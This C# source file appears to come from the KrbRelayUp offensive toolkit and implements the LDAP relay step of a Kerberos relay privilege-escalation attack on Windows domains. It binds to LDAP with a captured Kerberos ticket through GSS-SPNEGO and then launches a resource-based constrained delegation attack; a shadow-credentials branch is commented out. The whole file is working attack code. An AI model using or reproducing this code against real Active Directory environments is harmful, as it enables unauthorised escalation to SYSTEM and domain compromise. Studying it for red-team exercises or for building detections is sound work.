using System;
using System.Runtime.InteropServices;
using static KrbRelayUp.Relay.Natives;
using static KrbRelayUp.Relay.Relay;

namespace KrbRelayUp.Relay
{
    public class Ldap
    {
        public enum RelayAttackType
        {
            RBCD = 1,
            ShadowCred = 2
        }

        public static void Relay(RelayAttackType attackType, string sid = null, string computerName = null)
        {
            //create berval struct with the kerberos ticket
            var sTicket = new SecBuffer(ticket);
            var berval = new berval
            {
                bv_len = sTicket.cbBuffer,
                bv_val = sTicket.pvBuffer
            };
            var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
            Marshal.StructureToPtr(berval, bervalPtr, false);
            var bind = ldap_sasl_bind(
                ld,
                "",
                "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
                bervalPtr,
                IntPtr.Zero,
                IntPtr.Zero,
                out IntPtr servresp);
            
            ldap_get_option(ld, 0x0031, out int value);

            if ((LdapStatus)value == LdapStatus.LDAP_SUCCESS)
            {
                Console.WriteLine("[+] LDAP session established");

                try
                {
                    if (attackType == RelayAttackType.RBCD)
                    {
                        if (!string.IsNullOrEmpty(sid))
                            Attacks.Ldap.RBCD.attack(ld, sid, computerName);
                    }
                    if (attackType == RelayAttackType.ShadowCred)
                    {
                        //string arg1 = relayedUser;
                        //    if (!string.IsNullOrEmpty(attacks["shadowcred"]))
                        //        arg1 = attacks["shadowcred"];
                        //
                        //    Attacks.Ldap.ShadowCredential.attack(ld, arg1);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                ldap_unbind(ld);
                Environment.Exit(0);
            }
            if ((LdapStatus)value != LdapStatus.LDAP_SASL_BIND_IN_PROGRESS)
            {
                Console.WriteLine("[-] LDAP connection failed");
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...");

                // get first ap_rep from ldap
                berval msgidp2 = (berval)Marshal.PtrToStructure(servresp, typeof(berval));
                byte[] msgidbytes = new byte[msgidp2.bv_len];
                Marshal.Copy(msgidp2.bv_val, msgidbytes, 0, msgidp2.bv_len);
                apRep1 = msgidbytes;
            }
        }
    }
}